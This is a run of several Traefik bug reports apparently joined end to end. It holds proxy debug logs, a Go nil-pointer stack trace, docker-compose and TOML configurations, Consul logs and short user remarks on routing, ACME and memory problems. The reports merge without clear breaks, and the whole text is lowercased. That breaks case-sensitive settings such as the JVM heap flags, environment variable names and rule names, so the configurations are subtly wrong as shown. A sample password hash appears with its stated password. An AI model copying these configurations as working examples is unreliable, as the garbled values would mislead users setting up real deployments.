"},\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":true,\\"proxyprotocol\\":{\\"insecure\\":false,\\"trustedips\\":[\\"10.196.0.0/16\\"]},\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"https\\":{\\"address\\":\\":443\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":true,\\"proxyprotocol\\":{\\"insecure\\":false,\\"trustedips\\":[\\"10.196.0.0/16\\"]},\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}},\\"traefik\\":{\\"address\\":\\":8080\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\",\\"https\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"keeptrailingslash\\":false,\\"web\\":null,\\"docker\\":null,\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":[\\"kube-system\\",\\"routing-rules\\",\\"devops\\"],\\"labelselector\\":\\"traffic-type=vpn\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":{\\"ip\\":\\"\\",\\"hostname\\":\\"\\",\\"publishedservice\\":\\"routing/router-vpn-traefik\\"}},\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":{\\"entrypoint\\":\\"traefik\\",\\"dashboard\\":true,\\"debug\\":true,\\"currentconfigurations\\":null,\\"statistics\\":{\\"recenterrors\\":100}},\\"metrics\\":{\\"prometheus\\":{\\"buckets\\":[0.1,0.2,0.5,0.8,1,2.5,5,7.5,10],\\"entrypoint\\":\\"traefik\\"},\\"datadog\\":null,\\"statsd\\":null,\\"influxdb\\":null},\\"ping\\":null,\\"hostresolver\\":null}","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ ","time":"2018-12-18t21:34:22z"}
{"level":"debug","msg":"configured prometheus metrics","time":"2018-12-18t21:34:22z"}
{"level":"debug","msg":"creating regex redirect http -\\u003e ^ -\\u003e ","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"preparing server http \\u0026{address::80 tls:\\u003cnil\\u003e redirect: auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:true proxyprotocol: forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"enabling proxyprotocol for trusted ips [10.196.0.0/16]","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"preparing server https \\u0026{address::443 tls:\\u003cnil\\u003e redirect:\\u003cnil\\u003e auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:true proxyprotocol: forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"enabling proxyprotocol for trusted ips [10.196.0.0/16]","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"preparing server traefik \\u0026{address::8080 tls:\\u003cnil\\u003e redirect:\\u003cnil\\u003e auth:\\u003cnil\\u003e whitelistsourcerange:[] whitelist:\\u003cnil\\u003e compress:false proxyprotocol:\\u003cnil\\u003e forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"starting provider configuration.provideraggregator {}","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"starting server on :80","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"starting server on :443","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"starting server on :8080","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":[\\"kube-system\\",\\"routing-rules\\",\\"devops\\"],\\"labelselector\\":\\"traffic-type=vpn\\",\\"ingressclass\\":\\"\\",\\"ingressendpoint\\":{\\"ip\\":\\"\\",\\"hostname\\":\\"\\",\\"publishedservice\\":\\"routing/router-vpn-traefik\\"}}","time":"2018-12-18t21:34:22z"}
{"level":"debug","msg":"using ingress label selector: \\"traffic-type=vpn\\"","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"ingress label selector is: \\"traffic-type=vpn\\"","time":"2018-12-18t21:34:22z"}
{"level":"info","msg":"creating in-cluster provider client","time":"2018-12-18t21:34:22z"}
{"level":"debug","msg":"received kubernetes event kind *v1beta1.ingress","time":"2018-12-18t21:34:23z"}
{"level":"error","msg":"error in go routine: runtime error: invalid memory address or nil pointer dereference","time":"2018-12-18t21:34:23z"}
{"level":"error","msg":"stack: goroutine 40 [running]:\ runtime/debug.stack( , , )\ \\t/usr/local/go/src/runtime/debug/stack.go:24 + \ github.com/containous/traefik/safe.defaultrecovergoroutine( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:148 + \ github.com/containous/traefik/safe.operationwithrecover.func1.1( )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:156 + \ panic( , )\ \\t/usr/local/go/src/runtime/panic.go:513 + \ github.com/containous/traefik/provider/kubernetes.(*clientimpl).getservice( , , , , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/client.go:198 + \ github.com/containous/traefik/provider/kubernetes.(*provider).updateingressstatus( , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:442 + \ github.com/containous/traefik/provider/kubernetes.(*provider).loadingresses( , , , , , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:414 + \ github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1.1( , )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:145 + \ github.com/containous/traefik/safe.operationwithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:160 + \ github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , )\ \\t/go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 + \ github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1( )\ \\t/go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:165 + \ github.com/containous/traefik/safe.(*pool).go.func1()\ \\t/go/src/github.com/containous/traefik/safe/routine.go:78 + \ github.com/containous/traefik/safe.gowithrecover.func1( , )\ \\t/go/src/github.com/containous/traefik/safe/routine.go:142 + \ created by github.com/containous/traefik/safe.gowithrecover\ \\t/go/src/github.com/containous/traefik/safe/routine.go:136 + \ ","time":"2018-12-18t21:34:23z"}
{"level":"error","msg":"provider connection error: panic in operation: %!s(\\u003cnil\\u003e); retrying in 335.106995ms","time":"2018-12-18t21:34:23z"}
**docker-compose bin**
jlorenzo@docker01:~/gestio$ sudo docker-compose version
docker-compose version 1.23.1, build b02f1306
docker-py version: 3.5.0
cpython version: 3.6.7
openssl version: openssl 1.1.0f 25 may 2017
jlorenzo@docker01:~/gestio$ sudo docker --version
docker version 18.09.0, build 4d60db4
``` **so ubuntu 18** ```console
jlorenzo@docker01:~/gestio$ uname -a
linux docker01 4.15.0-42-generic #45-ubuntu smp thu nov 15 19:32:57 utc 2018 x86_64 x86_64 x86_64 gnu/linux
``` **traefik.toml**
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":80" [docker]
endpoint = "unix:///var/run/docker.sock"
domain = "docker.localhost"
exposedbydefault = false ```
**docker-compose.yml**
version: "3.7"
networks: backend: driver: bridge frontend: driver: bridge
volumes: portainer_data: grafana_data:
services: influxdb: labels: - "traefik.enable=false" - "traefik.frontend.rule=host:influxdb.test.local;" image: influxdb volumes: - /var/lib/docker/influxdb:/var/lib/influxdb networks: - backend cadvisor: labels: - "traefik.enable=false" - "traefik.frontend.rule=host:cadvisor.test.local;" image: google/cadvisor volumes: - /:/rootfs:ro # - /var/run:/var/run:ro - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro networks: - backend - frontend command: -storage_driver=influxdb -storage_driver_db=cadvisor_db -storage_driver_user=xxxxxxx -storage_driver_password=xxxxxx -storage_driver_host=influxdb:8086 depends_on: - influxdb prometheus: labels: - "traefik.enable=true" - "traefik.docker.network:gestio_frontend" - "traefik.port=80" - "traefik.frontend.rule=host:prometheus.test.local" image: prom/prometheus networks: - backend volumes: - /home/user/gestio/prometheus.yml:/etc/prometheus.yml grafana: labels: - "traefik.enable=true" - "traefik.docker.network:gestio_frontend" - "traefik.port=80" - "traefik.frontend.rule=host:monitor.test.local;" image: grafana/grafana environment: - gf_security_admin_password=xxxxx volumes: - grafana_data:/var/lib/grafana networks: - backend - frontend portainer: labels: - "traefik.enable=true" - "traefik.docker.network:gestio_frontend" - "traefik.port=80" - "traefik.frontend.rule=host:orquestrador.test.local;" image: portainer/portainer volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer_data:/data networks: - frontend traefik: image: traefik # imatge oficial de traefik command: --api --docker --web --web.metrics.prometheus --web.metrics.prometheus.buckets="0.1,0.3,1.2,5.0" loglevel=debug ports: - "80:80" - "443:443" - "8080:8080" networks: - frontend volumes: - /var/run/docker.sock:/var/run/docker.sock - /home/user/signasuite/traefik.toml:/etc/traefik/traefik.toml docker
docker's networks
jlorenzo@docker01:~/gestio$ sudo docker network ls
network id name driver scope
d6521d3d44c7 bridge bridge local
43686b370425 gestio_backend bridge local
288f68d62f2b gestio_frontend bridge local
25475bc387ea host host local
60b8fd783dfd none null local
``` and the docker are on both network with inspect and the tag seems configured:
jlorenzo@docker01:~/gestio$ sudo docker inspect 05788279801f | grep -i network "networkmode": "gestio_backend", "traefik.docker.network:gestio_frontend": "", "networksettings": { "networks": { "networkid": "43686b3704251e79f52164a78b177e76dc92efd332afdbf0ee41d29b0c3180a1", "networkid": "288f68d62f2b9ff17b5a428717b49b694f32a3074d752390cb28c9dd4adc071a",
``` i tried to use "default" and if i set the traefik on both networks then the reverse proxy works (as traefik sees both network and can route the request to backend) but i want the second one out of traefik network.
version: "3.6"
services: traefik: image: traefik:1.7 # use traefik:alpine if you need sh to investigate faults deploy: placement: constraints: - node.role == manager labels: - traefik.port=8080 - traefik.frontend.rule=pathprefixstrip:/traefik command: - --docker - --docker.swarmmode - --docker.network=scrapy_traefiknet - --api - "--defaultentrypoints=http,https" - "--entrypoints=name:http address::80 redirect.entrypoint:https" - >- --entrypoints=name:https address::443 tls auth.digest.removeheader:true auth.digest.users:test:traefik:a2688e031edb4be6a3797f3882655c05 ports: - "80:80" - "443:443" volumes: - /var/run/docker.sock:/var/run/docker.sock networks: - traefiknet
elasticsearch: image: docker.elastic.co/elasticsearch/elasticsearch:6.4.2 deploy: update_config: order: start-first environment: - discovery.type=single-node # - bootstrap.memory_lock=true # not supported by docker swarm yet, see issue #81 - "es_java_opts=-xms2g -xmx2g" ulimits: # not supported by docker swarm yet, see issue #81 memlock: soft: -1 hard: -1 volumes: - esdata1:/usr/share/elasticsearch/data networks: - esnet ports: - "9200:9200" kibana: image: docker.elastic.co/kibana/kibana:6.4.2 deploy: labels: - traefik.port=5601 - traefik.frontend.rule=pathprefix:/kibana environment: - server_basepath=/kibana - server_rewritebasepath=true # remove in kibana 7.x (as true will be default) networks: - esnet - traefiknet
volumes: esdata1:
networks: esnet: traefiknet:
``` launch with: `docker stack deploy -c docker-stack.yml` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch)
# version: "3.2"
services: traefik_init: image: traefik:1.5 command: - "storeconfig" - "--api" - "--entrypoints=name:http address::80 redirect.entrypoint:https" - "--entrypoints=name:https address::443 tls" - "--defaultentrypoints=http,https" - "--acme" - "--acme.storage=traefik/acme/account" - "--acme.entrypoint=https" - "--acme.httpchallenge.entrypoint=http" - "--acme.onhostrule=true" - "--acme.ondemand=false" - "--acme.email=foobar@example.com" - "--docker" - "--docker.swarmmode" - "--docker.domain=mycompany.com" - "--docker.watch" - "--consul" - "--consul.endpoint=consul:8500" - "--consul.prefix=traefik" networks: - traefik deploy: restart_policy: condition: on-failure depends_on: - consul traefik: image: traefik:1.5 depends_on: - traefik_init - consul command: - "--consul" - "--consul.endpoint=consul:8500" - "--consul.prefix=traefik" volumes: - /var/run/docker.sock:/var/run/docker.sock networks: - webgateway - traefik ports: - target: 80 published: 80 mode: host - target: 443 published: 443 mode: host - target: 8080 published: 8080 mode: host deploy: mode: global placement: constraints: - node.role == manager update_config: parallelism: 1 delay: 10s restart_policy: condition: on-failure consul: image: consul command: agent -server -bootstrap-expect=1 volumes: - consul-data:/consul/data environment: - consul_local_config={"datacenter":"us_east2","server":true} - consul_bind_interface=eth0 - consul_client_interface=eth0 deploy: replicas: 1 placement: constraints: - node.role == manager restart_policy: condition: on-failure networks: - traefik networks: webgateway: driver: overlay external: true traefik: driver: overlay volumes: consul-data: driver: local
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] serf: eventmemberjoin: 636badc2c448 10.0.9.127
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/05 10:54:36 [info] raft: node at 10.0.5.7:8300 [leader] entering leader state
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/05 10:54:36 [info] consul: cluster leadership acquired
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/05 10:54:36 [info] consul: new leader elected: 053068134e4b
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] consul: handled member-join event for server "636badc2c448.us_east2" in area "wan"
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] consul: adding lan server 636badc2c448 (addr: tcp/10.0.9.127:8300) (dc: us_east2)
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/05 10:54:36 [info] consul: member '053068134e4b' joined, marking health alive
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] agent: started dns server 10.0.9.127:8600 (udp)
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] agent: started dns server 10.0.9.127:8600 (tcp)
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/05 10:54:37 [info] agent: synced node info
traefik_consul.1.vx3sp9vvv5zc@example1100 | ==> failed to check for updates: get dial tcp: lookup checkpoint-api.hashicorp.com on 127.0.0.11:53: no such host
traefik_consul.1.vx3sp9vvv5zc@example1100 | ==> failed to check for updates: get dial tcp: lookup checkpoint-api.hashicorp.com on 127.0.0.11:53: no such host
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] agent: started http server on 10.0.9.127:8500 (tcp)
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: caught signal: terminated
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:28:58 [info] agent: started state syncer
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:06 [err] agent: failed to sync remote state: no cluster leader
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: graceful shutdown disabled
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [warn] raft: heartbeat timeout from "" reached, starting election
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: requesting shutdown
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] consul: shutting down server
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] raft: node at 10.0.9.127:8300 [candidate] entering candidate state in term 2
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [warn] serf: shutdown without a leave
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [warn] serf: shutdown without a leave
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] raft: election won
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] manager: shutting down
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] raft: node at 10.0.9.127:8300 [leader] entering leader state
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: consul server down
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: shutdown complete
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] consul: cluster leadership acquired
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: stopping dns server 10.0.5.7:8600 (tcp)
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] consul: new leader elected: 636badc2c448
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:07 [info] consul: member '636badc2c448' joined, marking health alive
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: stopping dns server 10.0.5.7:8600 (udp)
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:47 [info] agent: stopping http server 10.0.5.7:8500 (tcp)
traefik_consul.1.q7egi9lzz6e9@example1099 | 2018/12/07 09:29:08 [info] agent: synced node info
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:48 [warn] agent: timeout stopping http server 10.0.5.7:8500 (tcp)
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:48 [info] agent: waiting for endpoints to shut down
traefik_consul.1.q7egi9lzz6e9@example1099 | ==> failed to check for updates: get dial tcp: lookup checkpoint-api.hashicorp.com on 127.0.0.11:53: no such host
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:48 [info] agent: endpoints down
traefik_consul.1.vx3sp9vvv5zc@example1100 | 2018/12/07 09:28:48 [info] agent: exit code: 1 ```
endpoint = "localhost:8501"
watch = true
prefix = "frontend" [consul.tls] ca = "/etc/ssl/pki/realms/consul/ca.crt" cert = "/etc/pki/realms/consul/default.crt" key = "/etc/pki/realms/consul/default.key" insecureskipverify = false
``` ```json { "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "keeptrailingslash": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": { "watch": true, "filename": "", "constraints": [], "trace": false, "templateversion": 0, "debugloggeneratedtemplate": false, "endpoint": "xxxx", "prefix": "frontend", "tls": { "ca": "xxxx", "cert": "xxxx", "key": "xxxx" }, "username": "", "password": "" }, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "hostresolver": null, "configfile": "/etc/traefik/traefik.toml"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) ```
dec 04 10:03:50 traefik traefik[38168]: time="2018-12-04t10:03:50-05:00" level=warning msg="error checking new version: get x509:
certificate signed by unknown authority" dec 04 09:54:13 traefik traefik[38168]: time="2018-12-04t09:54:13-05:00" level=error msg="error getting acme certificate for domain [\\"*.deckersheaven.com\\"]: cannot obtain certificates: acme: error -> one or more domains had a problem:\ [deckersheaven.com] error presenting token: route53: failed to determine hosted zone id: requesterror: send request failed\ caused by: get x509: certificate signed by unknown authority\ "
```toml defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" compress = true [entrypoints.http.proxyprotocol] trustedips = ["xxxx"] [entrypoints.https] address = ":443" compress = true [entrypoints.https.proxyprotocol] trustedips = ["xxxx"] [entrypoints.https.tls] minversion = "versiontls11" ciphersuites = [ "tls_ecdhe_rsa_with_aes_128_gcm_sha256", "tls_ecdhe_rsa_with_chacha20_poly1305", "tls_ecdhe_rsa_with_aes_128_cbc_sha", "tls_ecdhe_rsa_with_aes_256_cbc_sha", "tls_ecdhe_ecdsa_with_aes_128_cbc_sha", "tls_ecdhe_ecdsa_with_aes_256_cbc_sha" ] [respondingtimeouts] idletimeout = "900s" [lifecycle] requestacceptgracetimeout = "10s" gracetimeout = "10s" [api] [rest] [kubernetes] [kubernetes.ingressendpoint] hostname = "xxxx.xxxx" [metrics] [metrics.prometheus] [accesslog]
``` ### logs
time="2018-11-28t11:44:33z" level=warning msg="endpoints not available for xxx"
time="2018-11-28t11:44:33z" level=warning msg="endpoints not available for xxx"
time="2018-11-28t11:44:33z" level=warning msg="endpoints not available for xxx"
tons of those ^ i suspect it being a memory leak in watcher watching the services/endpoints as this memory growth is specific just in this case, on our other clusters where we don't downscale deployments like this traefik works just fine.
defaultentrypoints = ["http", "https"]
loglevel = "info" [traefiklog] [accesslog] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.metrics] address = ":9301" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/tls.crt" keyfile = "/ssl/tls.key" [kubernetes] [lifecycle] requestacceptgracetimeout = "10s" gracetimeout = "7200s" [metrics] [metrics.prometheus] entrypoint = "metrics"
``` ### if applicable, please paste the log output in debug level (`--loglevel=debug` switch) n/a
```docker version:
docker --version
docker version 18.06.1-ce, build e68fc7a
i'm running traefik via docker-compose (see further below for the file) on an ubuntu 16.04 machine
(this output, which i got by `docker exec traefik traefik bug` seems to be wrong btw, see the docker-compose file where i'm actually enabled anonymous data collection and setting debug to true etc) ```json
{ "lifecycle": { "requestacceptgracetimeout": 0, "gracetimeout": 0 }, "gracetimeout": 0, "debug": false, "checknewversion": true, "sendanonymoususage": false, "accesslogsfile": "", "accesslog": null, "traefiklogsfile": "", "traefiklog": null, "tracing": null, "loglevel": "", "entrypoints": {}, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 0, "insecureskipverify": false, "rootcas": null, "retry": null, "healthcheck": { "interval": 30000000000 }, "respondingtimeouts": null, "forwardingtimeouts": null, "allowminweightzero": false, "keeptrailingslash": false, "web": null, "docker": null, "file": null, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": null, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "servicefabric": null, "rest": null, "api": null, "metrics": null, "ping": null, "hostresolver": null, "configfile": ""
this docker-compose file should make reproducing the issue easy: ```yaml
version: \'3\' networks: traefik: external: true services: traefik: image: traefik:v1.7-alpine container_name: traefik restart: always ports: - 80:80 networks: - traefik volumes: - /var/run/docker.sock:/var/run/docker.sock:ro command: - --debug=true - --loglevel=debug - --sendanonymoususage=true - --defaultentrypoints=http - "--entrypoints=name:http address::80" - --docker.domain=${domain} - --docker.endpoint=unix:///var/run/docker.sock - --docker.watch=true - --docker.exposedbydefault=false whoami: image: emilevauge/whoami restart: always networks: - traefik expose: - 80 labels: - "traefik.docker.network=traefik" - "traefik.enable=true" - "traefik.port=80" - "traefik.backend=foo" - "traefik.frontend.rule=host:${domain}" - "traefik.frontend.auth.based.users=${basic_auth}"
``` with `domain=dont-do-this-at.work` and `basic_auth=metrics:$apr1$aoc2p0ia$afplbivczpfalkwt816fk.` (the pass is 'whatever42' if you decided to use this hash, or just make your own with `htpasswd`
i've tried md5 and bcrypt hashes, both produce the error) in my environment, for example in a `.env` file next to the docker-compose file
### if applicable, please paste the log output at debug level (`--loglevel=debug` switch) ```
$ docker-compose up
starting traefik ..
creating npe_whoami_1_f1015354c027 ..
attaching to traefik, npe_whoami_1_41cd7db5169a
whoami_1_41cd7db5169a | starting up on port 80
traefik | time="2018-11-19t22:42:15z" level=info msg="traefik version v1.7.4 built on 2018-10-30_10:44:30am"
traefik | time="2018-11-19t22:42:15z" level=debug msg="global configuration loaded {\\"lifecycle\\":{\\"requestacceptgracetimeout\\":0,\\"gracetimeout\\":10000000000},\\"gracetimeout\\":0,\\"debug\\":true,\\"checknewversion\\":true,\\"sendanonymoususage\\":true,\\"accesslogsfile\\":\\"\\",\\"accesslog\\":null,\\"traefiklogsfile\\":\\"\\",\\"traefiklog\\":null,\\"tracing\\":null,\\"loglevel\\":\\"debug\\",\\"entrypoints\\":{\\"http\\":{\\"address\\":\\":80\\",\\"tls\\":null,\\"redirect\\":null,\\"auth\\":null,\\"whitelistsourcerange\\":null,\\"whitelist\\":null,\\"compress\\":false,\\"proxyprotocol\\":null,\\"forwardedheaders\\":{\\"insecure\\":true,\\"trustedips\\":null}}},\\"cluster\\":null,\\"constraints\\":[],\\"acme\\":null,\\"defaultentrypoints\\":[\\"http\\"],\\"providersthrottleduration\\":2000000000,\\"maxidleconnsperhost\\":200,\\"idletimeout\\":0,\\"insecureskipverify\\":false,\\"rootcas\\":null,\\"retry\\":null,\\"healthcheck\\":{\\"interval\\":30000000000},\\"respondingtimeouts\\":null,\\"forwardingtimeouts\\":null,\\"allowminweightzero\\":false,\\"keeptrailingslash\\":false,\\"web\\":null,\\"docker\\":{\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"dont-do-this-at.work\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"\\"},\\"file\\":null,\\"marathon\\":null,\\"consul\\":null,\\"consulcatalog\\":null,\\"etcd\\":null,\\"zookeeper\\":null,\\"boltdb\\":null,\\"kubernetes\\":null,\\"mesos\\":null,\\"eureka\\":null,\\"ecs\\":null,\\"rancher\\":null,\\"dynamodb\\":null,\\"servicefabric\\":null,\\"rest\\":null,\\"api\\":null,\\"metrics\\":null,\\"ping\\":null,\\"hostresolver\\":null}"
traefik | time="2018-11-19t22:42:15z" level=info msg="\ stats collection is enabled.\ many thanks for contributing to traefik\'s improvement by allowing us to receive anonymous information from your configuration.\ help us improve traefik by leaving this feature on :)\ more details on: #collected-data\ "
traefik | time="2018-11-19t22:42:15z" level=info msg="preparing server http &{address::80 tls:<nil> redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
traefik | time="2018-11-19t22:42:15z" level=info msg="starting provider configuration.provideraggregator {}"
traefik | time="2018-11-19t22:42:15z" level=info msg="starting server on :80"
traefik | time="2018-11-19t22:42:15z" level=info msg="starting provider *docker.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":null,\\"trace\\":false,\\"templateversion\\":2,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"unix:///var/run/docker.sock\\",\\"domain\\":\\"dont-do-this-at.work\\",\\"tls\\":null,\\"exposedbydefault\\":false,\\"usebindportip\\":false,\\"swarmmode\\":false,\\"network\\":\\"\\"}"
traefik | time="2018-11-19t22:42:15z" level=debug msg="provider connection established with docker 18.09.0 (api 1.39)"
traefik | time="2018-11-19t22:42:15z" level=debug msg="originlabelsmap[com.docker.compose.container-number:1 com.docker.compose.oneoff:false com.docker.compose.service:whoami com.docker.compose.slug:41cd7db5169afaa027632e92e1fa2d88ed8bd49b217b9cd3fa48632ca45b8c com.docker.compose.version:1.23.1 traefik.backend:foo traefik.docker.network:traefik com.docker.compose.config-hash:1c459ff6e8cc9a224c32794db66ed8f2e4f58a0a8d6a3202b01a7beae28aa20c traefik.frontend.rule:host:dont-do-this-at.work traefik.enable:true traefik.frontend.auth.based.users:metrics:$apr1$aoc2p0ia$afplbivczpfalkwt816fk
traefik.port:80 com.docker.compose.project:npe]"
traefik | time="2018-11-19t22:42:15z" level=debug msg="alllabelsmap[:map[traefik.frontend.auth.based.users:metrics:$apr1$aoc2p0ia$afplbivczpfalkwt816fk
